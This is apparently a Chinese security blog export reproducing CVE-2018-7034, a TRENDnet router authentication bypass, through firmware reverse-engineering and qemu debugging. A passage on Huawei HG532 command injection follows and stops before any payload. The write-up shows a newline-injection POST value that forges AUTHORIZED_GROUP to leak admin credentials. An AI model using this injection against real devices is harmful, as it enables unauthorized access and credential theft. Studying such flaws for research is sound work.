<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261016586.png" alt="image-20231026101606523"></p>
<p>可知 <code>TRENDnet TEW-751DR v1.03B03</code> 、<code>TEW-752DRU v1.03B01</code> 和 <code>TEW733GR v1.03B01</code> 设备存在认证绕过漏洞，通过使用 <code>AUTHORIZED_GROUP=1</code> 值，攻击者可以绕过认证，如通过请求 <code>getcfg.php</code> 进行信息泄露</p>
<p>我这里搜索的型号为 <code>TEW-751DR</code> ，尽管英语不太好，但是点进去看到 <code>Firmware</code> 和 <code>Download</code> 也知道是下载固件了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261017973.png" alt="image-20231026101730807"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261018801.png" alt="image-20231026101830688"></p>
<p>后续解压固件就不再提了，<code>binwalk</code> 直接解</p>
<h2 id="PHP代码"><a href="#PHP代码" class="headerlink" title="PHP代码"></a>PHP代码</h2><p><code>htdocs/web/getcfg.php</code> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span><span class="keyword">echo</span> <span class="string">&quot;&lt;?&quot;</span>;<span class="meta">?&gt;</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">&lt;?</span><span class="keyword">echo</span> <span class="string">&quot;?&gt;&quot;</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;postxml&gt;</span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">include</span> <span class="string">&quot;/htdocs/phplib/trace.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&quot;CACHE&quot;</span>] == <span class="string">&quot;true&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">dump</span>(<span class="number">1</span>, <span class="string">&quot;/runtime/session/&quot;</span>.<span class="variable">$SESSION_UID</span>.<span class="string">&quot;/postxml&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$AUTHORIZED_GROUP</span> &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* not a power user, return error message */</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;\t&lt;result&gt;FAILED&lt;/result&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;\t&lt;message&gt;Not authorized&lt;/message&gt;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* cut_count() will return 0 when no or only one token. */</span></span><br><span class="line">		<span class="variable">$SERVICE_COUNT</span> = <span class="title function_ invoke__">cut_count</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="string">&quot;,&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;GETCFG: got &quot;</span>.<span class="variable">$SERVICE_COUNT</span>.<span class="string">&quot; service(s): &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>]);</span><br><span class="line">		<span class="variable">$SERVICE_INDEX</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (<span class="variable">$SERVICE_INDEX</span> &lt; <span class="variable">$SERVICE_COUNT</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$GETCFG_SVC</span> = <span class="title function_ invoke__">cut</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="variable">$SERVICE_INDEX</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">			<span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;GETCFG: serivce[&quot;</span>.<span class="variable">$SERVICE_INDEX</span>.<span class="string">&quot;] = &quot;</span>.<span class="variable">$GETCFG_SVC</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$GETCFG_SVC</span>!=<span class="string">&quot;&quot;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$file</span> = <span class="string">&quot;/htdocs/webinc/getcfg/&quot;</span>.<span class="variable">$GETCFG_SVC</span>.<span class="string">&quot;.xml.php&quot;</span>;</span><br><span class="line">				<span class="comment">/* GETCFG_SVC will be passed to the child process. */</span></span><br><span class="line">				<span class="keyword">if</span> (<span class="title function_ invoke__">isfile</span>(<span class="variable">$file</span>)==<span class="string">&quot;1&quot;</span>) <span class="title function_ invoke__">dophp</span>(<span class="string">&quot;load&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$SERVICE_INDEX</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;/postxml&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>因为 <code>php</code> 我基本也不太懂，不过也能大概猜个意思， <code>$_POST[&quot;SERVICES&quot;]</code> 是用户通过 <code>POST</code> 传参可控的，将这个可控的字段拼接到固定的路径里，然后检查这个文件是否存在，如果存在的话就进行加载</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$GETCFG_SVC</span> = <span class="title function_ invoke__">cut</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="variable">$SERVICE_INDEX</span>, <span class="string">&quot;,&quot;</span>);			</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;/htdocs/webinc/getcfg/&quot;</span>.<span class="variable">$GETCFG_SVC</span>.<span class="string">&quot;.xml.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">isfile</span>(<span class="variable">$file</span>)==<span class="string">&quot;1&quot;</span>) <span class="title function_ invoke__">dophp</span>(<span class="string">&quot;load&quot;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p><code>/htdocs/webinc/getcfg/</code> 路径下面正好有一个敏感文件是以 <code>.xml.php</code> 结尾，<code>DEVICE.ACCOUNT.xml.php</code> 该文件可以泄露用户名和密码等信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="string">&quot;/device/account/entry&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$InDeX</span> &gt; <span class="variable">$cnt</span>) <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t&lt;entry&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;uid&gt;&quot;</span>.		<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;uid&quot;</span>).	<span class="string">&quot;&lt;/uid&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;name&gt;&quot;</span>.		<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;name&quot;</span>).	<span class="string">&quot;&lt;/name&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;usrid&gt;&quot;</span>.		<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;usrid&quot;</span>).	<span class="string">&quot;&lt;/usrid&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;password&gt;&quot;</span>.	<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;password&quot;</span>).<span class="string">&quot;&lt;/password&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;group&gt;&quot;</span>.		<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;group&quot;</span>).	<span class="string">&quot;&lt;/group&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;description&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;description&quot;</span>).<span class="string">&quot;&lt;/description&gt;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;\t\t\t&lt;/entry&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以能通过验证的话，将 <code>SERVICES</code> 设置为 <code>DEVICE.ACCOUNT</code> 就能泄露路由器的信息。<code>if($AUTHORIZED_GROUP &lt; 0)</code> 这个可以通过伪造一个全局变量 <code>$AUTHORIZED_GROUP</code> 绕过验证。因为传入的数据都是先通过登录验证文件 <code>htdocs/cgibin</code> 的解析后，发送给 <code>php</code> 等文件进行处理，下面通过分析 <code>cgibin</code> 是如何设置 <code>$AUTHORIZED_GROUP </code> 字段，从而寻找一下利用的机会</p>
<h2 id="二进制程序逆向"><a href="#二进制程序逆向" class="headerlink" title="二进制程序逆向"></a>二进制程序逆向</h2><h3 id="phpcgi-main函数分析"><a href="#phpcgi-main函数分析" class="headerlink" title="phpcgi_main函数分析"></a>phpcgi_main函数分析</h3><p>因为 <code>phpcgi</code> 软链接到了 <code>cgibin</code> 上，这里 <code>*argv</code> 取的就是 <code>phpcgi</code> ，所以调用了 <code>phpcgi_main</code> 函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261332309.png" alt="image-20231026133236156"> </p>
<p><code>sobj_new</code> 创建了一个结构体，用于存放之后解析出来的各个字段，<code>sobj_add_string</code> 函数是将 <code>*(a2+4)</code> 的字符串给添加到刚刚的结构体中，因为 <code>a2</code> 就是 <code>main</code> 函数的 <code>argv</code> ，所以 <code>+4</code> 就取到了第一个命令行参数（必须要给一个命令行参数，否则会进入 <code>if(a1&lt;2)</code> 退出 ）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261333566.png" alt="image-20231026133346499" style="zoom:50%;" />



<p>最初的 <code>qemu</code> 用户级仿真的脚本是这样的（后续我也再根据报错和问题不断的调整）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-mipsel-static -E CONTENT_TYPE=&quot;application/&quot; -E REQUEST_METHOD=&quot;POST&quot;  -g 1234 ./phpcgi 123</span><br></pre></td></tr></table></figure>



<p>下面是动态调试结构体的情况，可以看到 <code>sobj_add_string</code> 函数执行后确实把第一个命令行参数 <code>123</code> 给添加进去了。执行了 <code>sobj_add_char</code> 后又在 <code>123</code> 的后面添加了一个 <code>\n</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261345501.png" alt="image-20231026134500357" style="zoom:50%;" />



<p>接下来是一个循环，<code>a3</code> 是 <code>main</code> 函数的 <code>envp</code> ，那么结合上面的分析不难猜测出这里是把所有的环境变量按照 <code>_SERVER_+环境变量+\n</code> 的形式添加到结构体里</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261353378.png" alt="image-20231026135320293" style="zoom:50%;" />

<p>调试界面可以看到确实把环境变量都添加到了这个结构体里…🤔，因为我没有用 <code>chroot</code> 来做调试的隔离环境，貌似把所有环境变量都遍历出来了？（emm，这里是我有意为之，我就是想看一下如果不做隔离环境，后面的分析和调试会不会出现问题）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261359173.png" alt="image-20231026135935844"></p>
<p>于是乎，我重新来一次在隔离环境中的调试。我执行了命令 <code>sudo chroot . ./qemu-mipsel-static -E REQUEST_METHOD=&quot;POST&quot;  -E CONTENT_TYPE=&quot;application/&quot; -g 1234 ./phpcgi 123</code> ，但是报错 <code>Error while loading ./phpcgi: No such file or directory</code> ，有点奇怪，于是我直接回到了文件系统的根目录，执行命令 <code>sudo chroot . ./qemu-mipsel-static -E REQUEST_METHOD=&quot;POST&quot; -E CONTENT_TYPE=&quot;application/&quot; -g 1234 ./usr/sbin/phpcgi 123</code> 。这次一切正常，重新调试</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261420231.png"></p>
<p>……还是这么多环境变量，那看起来这个地方用不用 <code>chroot</code> 都是一样的。</p>
<p>总之呢，这里就确实是把我设置的环境变量给导到结构体里了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261421775.png" alt="image-20231026142111731"></p>
<p>下面这部分代码先判断了 <code>REQUEST_METHOD</code> 的值，<code>HEAD</code> 或 <code>GET</code> 将 <code>sub_405CF8</code> 函数指针赋值给 <code>v11</code> ，<code>POST</code> 则将 <code>sub_405AC0</code> 函数指针赋值给 <code>v11</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261422090.png" alt="image-20231026142257022" style="zoom:50%;" />

<h3 id="cgibin-parse-request函数分析"><a href="#cgibin-parse-request函数分析" class="headerlink" title="cgibin_parse_request函数分析"></a>cgibin_parse_request函数分析</h3><p>目光直接聚焦到 <code>cgibin_parse_request</code> 函数，它的第一个参数是放的函数指针，第二个参数是结构体。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261433805.png" alt="image-20231026143301719"></p>
<p>这个 <code>parse_uri</code> 函数进去简单看了一下，貌似是把 <code>REQUEST_URI</code> 中的 <code>?</code> 后面部分给存入了结构体里，本来我是没传这个环境变量的，但是我发现不传的话，就会返回 <code>-1</code> （代码如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261443250.png" alt="image-20231026144301176" style="zoom:50%;" />



<p>因此加上这个环境变量，继续重调，此时的启动脚本如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static -E REQUEST_METHOD=&quot;POST&quot; -E CONTENT_TYPE=&quot;application/&quot;  -E REQUEST_URI=&quot;wtf?COOL&quot; -g 1234 ./usr/sbin/phpcgi 123</span><br></pre></td></tr></table></figure>



<p>结果走了没几步发现又退出了，发现 <code>CONTENT_TYPE</code> 和 <code>CONTENT_LENGTH</code> 的值也必须存在</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261449095.png" alt="image-20231026144935033"></p>
<p>继续改改改，现在的脚本是这样</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static -E REQUEST_METHOD=&quot;POST&quot; -E CONTENT_TYPE=&quot;application/&quot;  -E CONTENT_LENGTH=&quot;26214&quot; -E REQUEST_URI=&quot;wtf?COOL&quot; -g 1234 ./usr/sbin/phpcgi 123</span><br></pre></td></tr></table></figure>



<p>现在终于能来到这个位置了，想执行到第 <code>38</code> 行的指针，需要通过 <code>strncasecmp</code> 函数的检测</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261500377.png" alt="image-20231026150055286"></p>
<p>把目光看到 <code>0x433014</code> 的地址处（下图），这里很明显能看出来是三个内存单元组成了一个结构体，第一个成员是字符串常量，也就是 <code>strncasecmp</code> 比较时的 <code>v14</code>，第二个成员变量是 <code>strncasecmp</code> 函数的第三个参数 <code>v12</code> ，如果通过了检查就执行第三个成员变量（一个函数指针），所以这部分就是在匹配 <code>CONTENT_TYPE</code> 中的类型来执行不同的函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261504153.png" alt="image-20231026150428111"></p>
<h3 id="sub-40445C函数分析"><a href="#sub-40445C函数分析" class="headerlink" title="sub_40445C函数分析"></a>sub_40445C函数分析</h3><p>当我进入 <code>sub_40445C</code> 函数后发现有个 <code>strncasecmp</code> 进行判断，通过动态调试我发现这个参数 <code>a4</code> 貌似没控制到（如果你好奇为什么我只进入字符串 <code>application/</code> 对应的函数，其实只需要看一下另外几个函数就知道了，他们的返回值都是 <code>-1</code> ，后续都直接从程序退出了）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261516142.png" alt="image-20231026151634927"></p>
<p>感觉这里有一点奇怪，我就执行了 <code>grep -r &quot;application&quot; ./</code> 命令，搜到了下面的内容，这让我猜测 <code>qemu</code> 启动时设置的环境变量 <code>CONTENT_TYPE</code> 是 <code>application/x-www-form-urlencoded</code> 而不是 <code>application/</code> （<code>WEB</code> 常识没学好……）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261520522.png" alt="image-20231026152006138"></p>
<p>继续重调…</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static -E REQUEST_METHOD=&quot;POST&quot; -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;  -E CONTENT_LENGTH=&quot;26214&quot; -E REQUEST_URI=&quot;wtf?COOL&quot; -g 1234 ./usr/sbin/phpcgi 123</span><br></pre></td></tr></table></figure>



<p>先分析一下这里的 <code>select</code> 函数，它的作用是监视多个文件描述符的状态，当有任意一个文件描述符准备就绪（可读或者可写），<code>select</code> 函数就会通知程序，从而避免轮询文件描述符。下面代码的 <code>select</code> 函数中的第一个参数 <code>1</code> 指的是要检查的最大文件描述符加一，因此这里只监视了文件描述符 <code>0</code>（标准输入流）。第二个参数放的是要监视的可读文件描述符集合， <code>v21.__fds_bits[0] |= 1u</code> 这里把第一个元素（文件描述符为 <code>0</code> ）设置为 <code>1</code> ，这表示监视标准输入流中是否有数据。第三个参数和第四个参数都是 <code>0</code>，这表示没有要监视可写和异常的文件。第五个参数 <code>timeout</code> 则是该函数最长的等待时间。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v21.__fds_bits[<span class="number">0</span>] |= <span class="number">1u</span>;</span><br><span class="line">     timeout.tv_usec = <span class="number">0</span>;</span><br><span class="line">     timeout.tv_sec = <span class="number">5</span>;</span><br><span class="line">     v7 = select(<span class="number">1</span>, &amp;v21, <span class="number">0</span>, <span class="number">0</span>, &amp;timeout);</span><br></pre></td></tr></table></figure>

<p>我最初调试到这个 <code>select</code> 函数的时候，它会卡住五秒，然后返回一个 <code>0</code>（代表超时了），因为一旦这里返回 <code>0</code> 的话，后面就没办法走到 <code>read</code> 函数了（此处 <code>read</code> 函数读入的数据就是实际环境中 <code>POST</code> 报文的数据）。为了模拟真实的场景，我直接选择用 <code>set $v0=1</code> 逆天改命了一手，这样也确实能走到 <code>read</code> 函数。不过我后来重新思考了一波🤔， <code>select</code> 不就是没检测到标准输入流的数据么，可我压根还没输入数据怎么会检测到呢（我原先都是想着等 <code>read</code> 函数执行时，阻塞住等待输入再写入数据）</p>
<p>于是乎，我在 <code>select</code> <strong>函数执行前</strong>就把数据写到了 <code>qemu</code> 这边（下图右部分），而后 <code>select</code> 函数执行后立刻返回了 <code>1</code> （下图左部分）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271240993.png" alt="image-20231027124041484"></p>
<p>这样就可以顺理执行到 <code>read</code> 函数，如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271436225.png" alt="image-20231027143656986"></p>
<p>注意上图中，我在启动 <code>qemu</code> 的时候，给的 <code>CONTENT_LENGTH</code> 值是 <code>100</code> ，在下图中我标注了这段代码的执行流程，可见要想让 <code>sub_40445C</code> 函数返回 <code>1</code> 就得<strong>保证读入的数据长度和 <code>CONTENT_LENGTH</code> 一致</strong>，否则多跑一轮没有读到数据的话，就会返回 <code>-1</code> （这里也卡住我了一段时间，好险…差点又放弃了😅）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271418333.png" alt="image-20231027141800217"></p>
<p>如果 <code>sub_40445C</code> 返回 <code>-1</code> 的话， <code>cgibin_parse_request</code> 函数也返回 <code>-1</code> ，这样会触发 <code>cgibin_print_http_status(400, &quot;unsupported HTTP request&quot;, &quot;unsupported HTTP request&quot;)</code> 函数，这明显是报错了🙃</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271447968.png" alt="image-20231027144737899"></p>
<p>因此 <code>CONTENT_LENGTH</code> 必须要严格和输入的数据长度一样（实际 <code>POST</code> 报文的发送，这个 <code>CONTENT_LENGTH</code> 也不需要我们去刻意控制，它自己就能取到正常的值，这里是本地搭建的环境，要刻意设置一下），<code>cgibin_parse_request</code> 函数返回 <code>1</code> 的话，就可以执行下面的内容 </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271503192.png" alt="image-20231027150333144"></p>
<p><code>sess_validate</code> 函数在验证用户的身份，如果没有通过验证返回 <code>-1</code> ，这里本身就是未授权获取路由器的管理员用户名和密码，自然就没验证成功。于是乎 <code>AUTHORIZED_GROUP=-1</code> 就被添加到了结构体里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(v16, <span class="string">&quot;AUTHORIZED_GROUP=%d&quot;</span>, v13);</span><br><span class="line">sobj_add_string(v6, v16);</span><br><span class="line">sobj_add_char(v6, <span class="string">&#x27;\n&#x27;</span>);</span><br></pre></td></tr></table></figure>



<p>在此之前，<code>read</code> 读入的数据也被解析到了结构体里，现在的结构体里存放的字符串是这样</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271516991.png" alt="image-20231027151602637"></p>
<p>后续调用了 <code>xmldbc_ephp</code> 函数，这是把上图中的字符串通过套接字传输，写到了 <code>/var/run/xmldb_sock</code> 文件中，然后其他程序再从该文件中读取数据，而 <code>getcfg.php</code> 文件在读取 <code>$AUTHORIZED_GROUP</code> 值的时候，先读取到了我们伪造的 <code>AUTHORIZED_GROUP=1</code> 继而绕过验证</p>
<p>为了不影响主线，上面并没有提到 <code>_POST_SERVICES=DEVICE.ACCOUNT\nAUTHORIZED_GROUP=1</code> 是何时被写入内存的，它具体靠 <code>sub_403864</code> 函数来实现</p>
<h3 id="sub-403864函数分析"><a href="#sub-403864函数分析" class="headerlink" title="sub_403864函数分析"></a>sub_403864函数分析</h3><p>直接上图解，应该不难看懂</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271653934.png" alt="image-20231027165331769" style="zoom:50%;" />

<p>在看 <code>sub_40445C</code> 函数的时候，<code>IDA</code> 中 <code>72</code> 行的 <code>sub_403864(&amp;v16, (int)v22, v9);</code> 调用时，我一直纳闷，<code>sub_403864</code> 函数明明直接就是个死循环 <code>while</code> ，只能 <code>return</code> ，如何执行到后面对字符串的解码和写入操作的。完整调试完才发现，不是在 <code>72</code> 行进行的解码和写入操作，而是在 <code>80</code> 行再次调用了 <code>sub_403864</code> 函数时进行的操作…🥲</p>
<h3 id="sobj-unescape-uri函数分析"><a href="#sobj-unescape-uri函数分析" class="headerlink" title="sobj_unescape_uri函数分析"></a>sobj_unescape_uri函数分析</h3><p><code>sobj_unescape_uri</code> 函数看名字就是对 <code>uri</code>  进行解码的，这部分就是在扫描字符串中是否有 <code>%</code> ，如果有 <code>%</code> 的话，取它的下一位和下下一位，将其转换为一个十六进制数字，最后用 <code>sobj_add_char</code> 将这个字符添加回字符串中。比如传入的字符串是 <code>abc%0a123</code> ，那么解码后则为 <code>abc\n123</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271620972.png" alt="image-20231027162050749" style="zoom:50%;" />



<h3 id="sub-405AC0函数分析"><a href="#sub-405AC0函数分析" class="headerlink" title="sub_405AC0函数分析"></a>sub_405AC0函数分析</h3><p>此处的 <code>v9</code> 就是在 <code>phpcgi_main</code> 函数中的那个函数指针 <code>0x405AC0</code> ，</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271631185.png" alt="image-20231027163119133" style="zoom: 67%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271632621.png" alt="image-20231027163251517" style="zoom:50%;" />



<p>再看 <code>sub_405AC0</code> 函数，开始的 <code>if(*a2)</code> 是 <code>0</code> ，直接看 <code>else</code> 部分（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271636298.png" alt="image-20231027163622243"></p>
<p>首先是往 <code>a1</code> 里面添加了字符串 <code>_POST_</code> （这个 <code>a1</code> 是之前一直存放解析各种数据的结构体）</p>
<p>接着 <code>sobj_add_string((_DWORD *)a1, v5)</code> 向 <code>a1</code> 里面添加了 <code>POST</code> 内容（也就是 <code>read</code> 读入的数据）中 <code>=</code> 前面的部分（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271643019.png" alt="image-20231027164319210"></p>
<p>随后又向 <code>a1</code> 里写入了 <code>=</code> 和 <code>=</code> 后半部分以及 <code>\n</code> ，就不再赘述了。这个函数执行完毕后，就把 <code>POST</code> 报文的内容给按照一定格式解析写到了内存里</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271646961.png" alt="image-20231027164657601"></p>
<h2 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310261021021.png" alt="image-20231026102104827"></p>
<p>获取了用户名和密码，成功登录管理员后台</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310271919678.png" alt="image-20231027191932315"></p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>做这个漏洞复现的时候，感慨了好几次。好险…差一点又放弃了😅  因为网上的文章大多都千篇一律（除了 <strong>winmt</strong> 师傅😋他写的还是比较详细的），感觉就是拿 <code>poc</code> 打了一遍，然后过程写的省略就算了，说实话我还感觉有些驴唇不对马嘴…😶‍🌫️ 所以做的时候基本自己就遇见一个坑就分析一个坑，每个坑都是差点没爬出来（当时的想法是已经写的比其他人详细了，放弃这里的细节研究貌似也没啥）。好在没有得过且过，在每次想放弃的时候又坚持了一下，最终也是把自己有疑问的地方都分析清楚了</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7034">CVE - CVE-2018-7034 (mitre.org)</a></p>
<p><a href="https://www.iotsec-zone.com/article/384#d-link-%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E">一些经典IoT漏洞的分析与复现（新手向） - IOTsec-Zone</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
        <category>复现CVE</category>
      </categories>
      <tags>
        <tag>MIPS架构</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-17215复现（华为HG532命令执行）</title>
    <url>/posts/719b289c.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文对 <code>CVE-2017-17215</code> 的复现过程进行了记录，该漏洞位于华为 <code>HG532</code> 路由器，在 <code>UPnP</code> 服务中存在 <code>NewStatusURL</code> 和 <code>NewDownloadURL</code> 标签中的命令注入。通过向端口 <code>37215</code> ，地址为 <code>/ctrlt/DeviceUpgrade_1</code> 发送 <code>POST</code> 报文进行漏洞的触发。整体而言，这个漏洞确实是目前复现过最简单的了，但自己在做的时候依然踩了一些坑…😅</p>
<span id="more"></span>

<h3 id="固件链接"><a href="#固件链接" class="headerlink" title="固件链接"></a>固件链接</h3><p>固件链接：<a href="https://pan.baidu.com/s/1bhUyY-b6rxlAj8pG3cFFjQ?pwd=98uv">https://pan.baidu.com/s/1bhUyY-b6rxlAj8pG3cFFjQ?pwd=98uv</a><br>提取码：98uv</p>
<h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p>根据漏洞披露可知，在启动 <code>UPnP</code> 服务时，存在命令注入。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252023595.png" alt="image-20231025202359522"></p>
<p>用 <code>binwalk</code> 将固件解压后，把文件系统中 <code>/bin</code> 目录下的 <code>UPnP</code> 程序给拷贝出来，使用 <code>IDA</code> 分析定位漏洞点时，我的思路是先对<code>system</code> 函数交叉引用看看，既然是命令注入，那大概率是 <code>snprintf + system</code> 造成的。</p>
<p>在对 <code>system</code> 交叉引用到最后一个时，果然发现了漏洞点</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252029497.png" alt="image-20231025202940356"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252030294.png" alt="image-20231025203019229"></p>
<p>这里把 <code>v4</code> <code>v5</code> 和正常字符串拼接后，直接执行了 <code>system</code> 命令，由于 <code>NewStatusURL</code> 和 <code>NewDownloadURL</code> 标签中的内容是用户可控，导致了命令注入漏洞</p>
<h3 id="搭建复现环境"><a href="#搭建复现环境" class="headerlink" title="搭建复现环境"></a>搭建复现环境</h3><p>启动 <code>qemu</code> 之前，我是先执行 <code>net.sh</code> 脚本，创建了一个网桥并且设置了 <code>tap0</code> 接口留给 <code>qemu</code></p>
